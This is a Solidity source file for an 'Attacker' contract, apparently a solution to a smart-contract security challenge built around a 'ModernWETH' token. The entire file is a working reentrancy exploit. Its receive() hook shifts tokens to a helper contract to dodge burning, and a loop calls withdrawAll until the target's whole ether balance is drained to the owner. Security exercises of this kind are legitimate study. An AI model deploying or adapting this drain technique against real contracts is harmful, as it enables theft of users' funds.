// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./ModernWETH.sol";
import "./Receiver.sol";

contract Attacker
{
    ModernWETH public weth;
    Receiver public receiver;
    address public owner;

    constructor(address _wethAddress) {
        weth = ModernWETH(payable(_wethAddress));
        owner = msg.sender;
        receiver = new Receiver(_wethAddress);
    }

    function attack() public payable {
        require(msg.value == 10 ether, "You need to send 10 ether to start the attack");

        //First we deposit our 10 eth
        weth.deposit{value: 10 ether}();

        //Now we abuse the bug 100 times to get all the money out of the contract.
        while(address(weth).balance > 0) {
            //Call the withdraw function
            weth.withdrawAll();

            //Call the giveMyMoneysBack function to get the tokens out of the receiver contract
            receiver.giveMyMoneysBack();
        }

        //Send all the profits to the owner
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        //Move the tokens to our receiver contract to not burn them
        weth.transfer(address(receiver), 10 ether);
    }
}